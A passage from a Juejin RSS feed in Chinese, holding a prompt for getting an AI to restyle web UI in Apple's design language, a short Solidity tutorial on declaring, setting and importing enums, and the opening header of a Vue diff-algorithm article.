                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c5bb5877de2402c87c0c6e9c6330b89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Lmd5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765849562&amp;x-signature=A7nGowBuz1QVnUw8fMwUWg0Wkhc%3D" alt="export_1764901938560.gif" loading="lazy"/></p>
<p>如何让AI设计出Apple风格的顶级UI？给ai投喂以下提示词即可让你的页面变得和apple官网一样好看</p>
<h2 data-id="heading-0">提示词</h2>
<pre><code class="hljs language-md" lang="md"><span class="hljs-section"># Role (角色设定)</span>

你是一位世界顶级的 UI 工程师和创意开发专家，深谙 Apple 的设计哲学（Human Interface Guidelines）以及 Apple 官网的网页设计美学。你擅长将普通的 UI 代码重构为具有“Apple 质感”的顶级界面。

<span class="hljs-section"># Goal (任务目标)</span>

我将提供一个现有的代码项目。请你参考 Block Studio 对 Apple 风格的深度解析，对我提供的代码进行<span class="hljs-strong">**全方位重构**</span>。

<span class="hljs-section"># Design Principles (核心设计法则)</span>

请在重构时严格执行以下 6 大维度的设计规范：

<span class="hljs-section">### 1. 布局与结构：Bento Grid (便当盒美学)</span>
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**模块化容器：**</span> 将内容重组为圆角矩形的“卡片”，形成 Bento Grid 网格布局。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**间距 (Gap)：**</span> 保持宽敞统一的间距（24px - 32px），拒绝拥挤。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**全宽与居中：**</span> 大屏限制最大宽度（如 1120px）并居中，小屏自动堆叠。

<span class="hljs-section">### 2. 氛围与材质：Aurora &amp; Glass (极光与毛玻璃) ✨</span>
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Ambient Background (动态弥散背景):**</span> 
<span class="hljs-bullet">    *</span>   <span class="hljs-strong">**Base:**</span> 使用 <span class="hljs-code">`#F5F5F7`</span> 作为画布底色。
<span class="hljs-bullet">    *</span>   <span class="hljs-strong">**Orbs (光球):**</span> 在背景层放置 2-3 个巨大的圆形元素 (50vw-60vw)，使用 <span class="hljs-code">`fixed`</span> 定位。
<span class="hljs-bullet">    *</span>   <span class="hljs-strong">**Gradient:**</span> 光球填充径向渐变，推荐配色：淡蓝 <span class="hljs-code">`rgba(162, 210, 255, 0.4)`</span> 和 淡紫 <span class="hljs-code">`rgba(200, 180, 255, 0.3)`</span>。
<span class="hljs-bullet">    *</span>   <span class="hljs-strong">**Blur:**</span> 强制应用极大的高斯模糊 (<span class="hljs-code">`filter: blur(80px)`</span> 或更高)，使颜色柔和融合。
<span class="hljs-bullet">    *</span>   <span class="hljs-strong">**Animation:**</span> 添加缓慢的 infinite 浮动动画，让光斑有轻微的呼吸感。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Glassmorphism (毛玻璃):**</span> 卡片背景使用半透明白色 (<span class="hljs-code">`rgba(255, 255, 255, 0.8)`</span>) 配合 <span class="hljs-code">`backdrop-filter: blur(20px)`</span>，让背景的极光色能隐约透出。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Squircle:**</span> 所有卡片使用连续曲率大圆角 (24px)。

<span class="hljs-section">### 3. 组件层级：Button &amp; Input Hierarchy</span>
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Primary Buttons (主按钮):**</span> 核心行动。使用<span class="hljs-strong">**品牌蓝实心填充**</span> (#0071e3) + 白色文字 + 胶囊圆角。Hover 时亮度提升或带光晕。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Secondary Buttons (次级按钮):**</span> 辅助行动（如“选择文件”）。<span class="hljs-strong">**禁止使用透明背景**</span>。必须使用<span class="hljs-strong">**浅灰色实心填充**</span> (#E5E5EA 或 rgba(0,0,0,0.05)) + 深色文字，确保在白色卡片上清晰可见。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Inputs (输入框):**</span> 移除默认边框。使用浅灰背景 (#F2F2F7) + 深色文字。Focus 时背景变白 + 品牌色光晕。

<span class="hljs-section">### 4. 排版与信息：Big Type</span>
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**字体：**</span> 强制使用系统字体栈 (<span class="hljs-code">`-apple-system`</span>, <span class="hljs-code">`SF Pro`</span>, <span class="hljs-code">`PingFang SC`</span>)。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**层级：**</span> 标题粗黑 (700)，正文清晰 (400)，注释灰色 (#86868b)。标题字间距微缩 (-0.02em)。

<span class="hljs-section">### 5. 动效：Physics (物理感)</span>
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**非线性：**</span> 所有 Hover/Transition 必须使用弹簧曲线 (e.g., <span class="hljs-code">`cubic-bezier(0.25, 1, 0.5, 1)`</span>).
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**反馈：**</span> 按钮 Hover 时必须有 <span class="hljs-strong">**Scale (1.02)**</span> 或 <span class="hljs-strong">**Brightness**</span> 变化。
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**入场：**</span> 页面加载时，卡片应带有 <span class="hljs-code">`fade-in-up`</span> (淡入上浮) 的序列动画。

<span class="hljs-section">### 6. 细节修饰</span>
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Hairlines:**</span> 边框和分割线使用 1px 半透明线 (<span class="hljs-code">`rgba(255,255,255,0.6)`</span> 或 <span class="hljs-code">`rgba(0,0,0,0.1)`</span>).
<span class="hljs-bullet">*</span>   <span class="hljs-strong">**Icons:**</span> 使用 Emoji 或 SF Symbols 风格图标，可搭配微渐变背景容器。

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3分钟Solidity: 3.3 Enum枚举]]></title>    <link>https://juejin.cn/post/7581299982671839266</link>    <guid>https://juejin.cn/post/7581299982671839266</guid>    <pubDate>2025-12-08T15:50:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581299982671839266" data-draft-id="7581314241410842659" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3分钟Solidity: 3.3 Enum枚举"/> <meta itemprop="keywords" content="Solidity,web3,区块链"/> <meta itemprop="datePublished" content="2025-12-08T15:50:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3分钟Solidity: 3.3 Enum枚举
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T15:50:45.000Z" title="Mon Dec 08 2025 15:50:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如需获取本内容的最新版本，请参见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cyfrin.io%2Fglossary%2Fenum-solidity-code-example" target="_blank" title="https://www.cyfrin.io/glossary/enum-solidity-code-example" ref="nofollow noopener noreferrer">Cyfrin.io 上的 Enum（代码示例）</a></p>
<p>Solidity支持枚举类型，它们非常适合用于建模选择项和跟踪状态。
枚举可以在合约外部声明。</p>
<pre><code class="hljs language-solidity" lang="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Enum {
    // 表示运输状态的枚举
    enum Status {
        Pending,
        Shipped,
        Accepted,
        Rejected,
        Canceled
    }

    // 默认值是类型定义中列出的第一个元素，本例中为“Pending”
    Status public status;

    // 返回无符号整数
    // Pending  - 0
    // Shipped  - 1
    // Accepted - 2
    // Rejected - 3
    // Canceled - 4
    function get() public view returns (Status) {
        return status;
    }

    // 通过将无符号整数传递到输入来更新状态
    function set(Status _status) public {
        status = _status;
    }

    // 你可以像这样更新到特定的枚举
    function cancel() public {
        status = Status.Canceled;
    }

    // 删除会将枚举重置为其第一个值，0
    function reset() public {
        delete status;
    }
}
</code></pre>
<p>Remix Lite <a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.byteatatime.dev%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmNvbnRyYWN0IEVudW0gewogICAgLy8gRW51bSByZXByZXNlbnRpbmcgc2hpcHBpbmcgc3RhdHVzCiAgICBlbnVtIFN0YXR1cyB7CiAgICAgICAgUGVuZGluZywKICAgICAgICBTaGlwcGVkLAogICAgICAgIEFjY2VwdGVkLAogICAgICAgIFJlamVjdGVkLAogICAgICAgIENhbmNlbGVkCiAgICB9CgogICAgLy8gRGVmYXVsdCB2YWx1ZSBpcyB0aGUgZmlyc3QgZWxlbWVudCBsaXN0ZWQgaW4KICAgIC8vIGRlZmluaXRpb24gb2YgdGhlIHR5cGUsIGluIHRoaXMgY2FzZSAiUGVuZGluZyIKICAgIFN0YXR1cyBwdWJsaWMgc3RhdHVzOwoKICAgIC8vIFJldHVybnMgdWludAogICAgLy8gUGVuZGluZyAgLSAwCiAgICAvLyBTaGlwcGVkICAtIDEKICAgIC8vIEFjY2VwdGVkIC0gMgogICAgLy8gUmVqZWN0ZWQgLSAzCiAgICAvLyBDYW5jZWxlZCAtIDQKICAgIGZ1bmN0aW9uIGdldCgpIHB1YmxpYyB2aWV3IHJldHVybnMgKFN0YXR1cykgewogICAgICAgIHJldHVybiBzdGF0dXM7CiAgICB9CgogICAgLy8gVXBkYXRlIHN0YXR1cyBieSBwYXNzaW5nIHVpbnQgaW50byBpbnB1dAogICAgZnVuY3Rpb24gc2V0KFN0YXR1cyBfc3RhdHVzKSBwdWJsaWMgewogICAgICAgIHN0YXR1cyA9IF9zdGF0dXM7CiAgICB9CgogICAgLy8gWW91IGNhbiB1cGRhdGUgdG8gYSBzcGVjaWZpYyBlbnVtIGxpa2UgdGhpcwogICAgZnVuY3Rpb24gY2FuY2VsKCkgcHVibGljIHsKICAgICAgICBzdGF0dXMgPSBTdGF0dXMuQ2FuY2VsZWQ7CiAgICB9CgogICAgLy8gZGVsZXRlIHJlc2V0cyB0aGUgZW51bSB0byBpdHMgZmlyc3QgdmFsdWUsIDAKICAgIGZ1bmN0aW9uIHJlc2V0KCkgcHVibGljIHsKICAgICAgICBkZWxldGUgc3RhdHVzOwogICAgfQp9Cg%3D%3D" target="_blank" title="https://remix.byteatatime.dev/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmNvbnRyYWN0IEVudW0gewogICAgLy8gRW51bSByZXByZXNlbnRpbmcgc2hpcHBpbmcgc3RhdHVzCiAgICBlbnVtIFN0YXR1cyB7CiAgICAgICAgUGVuZGluZywKICAgICAgICBTaGlwcGVkLAogICAgICAgIEFjY2VwdGVkLAogICAgICAgIFJlamVjdGVkLAogICAgICAgIENhbmNlbGVkCiAgICB9CgogICAgLy8gRGVmYXVsdCB2YWx1ZSBpcyB0aGUgZmlyc3QgZWxlbWVudCBsaXN0ZWQgaW4KICAgIC8vIGRlZmluaXRpb24gb2YgdGhlIHR5cGUsIGluIHRoaXMgY2FzZSAiUGVuZGluZyIKICAgIFN0YXR1cyBwdWJsaWMgc3RhdHVzOwoKICAgIC8vIFJldHVybnMgdWludAogICAgLy8gUGVuZGluZyAgLSAwCiAgICAvLyBTaGlwcGVkICAtIDEKICAgIC8vIEFjY2VwdGVkIC0gMgogICAgLy8gUmVqZWN0ZWQgLSAzCiAgICAvLyBDYW5jZWxlZCAtIDQKICAgIGZ1bmN0aW9uIGdldCgpIHB1YmxpYyB2aWV3IHJldHVybnMgKFN0YXR1cykgewogICAgICAgIHJldHVybiBzdGF0dXM7CiAgICB9CgogICAgLy8gVXBkYXRlIHN0YXR1cyBieSBwYXNzaW5nIHVpbnQgaW50byBpbnB1dAogICAgZnVuY3Rpb24gc2V0KFN0YXR1cyBfc3RhdHVzKSBwdWJsaWMgewogICAgICAgIHN0YXR1cyA9IF9zdGF0dXM7CiAgICB9CgogICAgLy8gWW91IGNhbiB1cGRhdGUgdG8gYSBzcGVjaWZpYyBlbnVtIGxpa2UgdGhpcwogICAgZnVuY3Rpb24gY2FuY2VsKCkgcHVibGljIHsKICAgICAgICBzdGF0dXMgPSBTdGF0dXMuQ2FuY2VsZWQ7CiAgICB9CgogICAgLy8gZGVsZXRlIHJlc2V0cyB0aGUgZW51bSB0byBpdHMgZmlyc3QgdmFsdWUsIDAKICAgIGZ1bmN0aW9uIHJlc2V0KCkgcHVibGljIHsKICAgICAgICBkZWxldGUgc3RhdHVzOwogICAgfQp9Cg==" ref="nofollow noopener noreferrer">尝试一下</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db9d26e22e44bedac1f02f2c724e22d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja2JlYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765813845&amp;x-signature=P0TPWfRs%2FqH8OhzjoecVDDpiaXQ%3D" alt="solidity-Enum枚举" loading="lazy"/></p>
<h2 data-id="heading-0">声明和导入枚举</h2>
<p>声明枚举的文件</p>
<pre><code class="hljs language-solidity" lang="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
// 这是保存的'EnumDeclaration.sol'

enum Status {
    Pending,
    Shipped,
    Accepted,
    Rejected,
    Canceled
}
</code></pre>
<p>Remix <a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.ethereum.org%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKLy8gVGhpcyBpcyBzYXZlZCAnRW51bURlY2xhcmF0aW9uLnNvbCcKCmVudW0gU3RhdHVzIHsKICAgIFBlbmRpbmcsCiAgICBTaGlwcGVkLAogICAgQWNjZXB0ZWQsCiAgICBSZWplY3RlZCwKICAgIENhbmNlbGVkCn0K" target="_blank" title="https://remix.ethereum.org/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKLy8gVGhpcyBpcyBzYXZlZCAnRW51bURlY2xhcmF0aW9uLnNvbCcKCmVudW0gU3RhdHVzIHsKICAgIFBlbmRpbmcsCiAgICBTaGlwcGVkLAogICAgQWNjZXB0ZWQsCiAgICBSZWplY3RlZCwKICAgIENhbmNlbGVkCn0K" ref="nofollow noopener noreferrer">尝试一下</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/532f672f7d5942c78bc430dfe52f71b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja2JlYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765813845&amp;x-signature=cpUBvPJkn4tfI6De4oG%2BHiaVE8Y%3D" alt="solidity-enum枚举声明" loading="lazy"/></p>
<p>导入上述枚举的文件</p>
<pre><code class="hljs language-solidity" lang="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./EnumDeclaration.sol";

contract Enum {
    Status public status;
}
</code></pre>
<p>Remix Lite <a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.byteatatime.dev%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmltcG9ydCAiLi9FbnVtRGVjbGFyYXRpb24uc29sIjsKCmNvbnRyYWN0IEVudW0gewogICAgU3RhdHVzIHB1YmxpYyBzdGF0dXM7Cn0K" target="_blank" title="https://remix.byteatatime.dev/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmltcG9ydCAiLi9FbnVtRGVjbGFyYXRpb24uc29sIjsKCmNvbnRyYWN0IEVudW0gewogICAgU3RhdHVzIHB1YmxpYyBzdGF0dXM7Cn0K" ref="nofollow noopener noreferrer">尝试一下</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bf5c434f50a4c129362146087ddd5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja2JlYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765813845&amp;x-signature=Bfq3cmPpL3%2BG9VWiY%2FRMHQL48%2Fk%3D" alt="solidity-enum枚举导入" loading="lazy"/></p>
<hr/>
<p>END</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一文吃透Vue Diff原理：从核心逻辑到实战避坑]]></title>    <link>https://juejin.cn/post/7581210455827660836</link>    <guid>https://juejin.cn/post/7581210455827660836</guid>    <pubDate>2025-12-08T12:19:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581210455827660836" data-draft-id="7581097111896539190" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一文吃透Vue Diff原理：从核心逻辑到实战避坑"/> <meta itemprop="keywords" content="Vue.js,前端"/> <meta itemprop="datePublished" content="2025-12-08T12:19:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Dgua"/> <meta itemprop="url" content="https://juejin.cn/user/1135111924890654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一文吃透Vue Diff原理：从核心逻辑到实战避坑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1135111924890654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Dgua
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T12:19:06.000Z" title="Mon Dec 08 2025 12:19:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
